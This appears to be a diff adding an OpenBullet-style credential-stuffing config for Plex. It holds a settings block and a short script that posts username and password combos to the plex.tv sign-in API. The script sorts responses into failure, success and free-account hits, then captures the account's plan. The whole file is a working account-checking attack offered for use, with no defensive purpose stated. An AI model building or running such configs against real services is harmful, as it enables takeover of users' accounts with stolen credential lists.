@@ -1,0 +1,45 @@
+[SETTINGS]
+{
+  "Name": "Plex",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-25T22:58:21.3989607-05:00",
+  "AdditionalInfo": "",
+  "Author": "FFaez1267",
+  "Version": "1.0.2",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://plex.tv/api/v2/users/signin" 
+  CONTENT "email=<USER>&login=<USER>&password=<PASS>&includeProviders=true" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "X-Plex-Client-Identifier: 34fd4314-a0ec-ee09-586f-e517deffdc8d" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "message\":\"User could not be authenticated" 
+  KEYCHAIN Success OR 
+    KEY "email" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "active\":false" 
+
+PARSE "<SOURCE>" JSON "plan" -> CAP "Plan" 
+
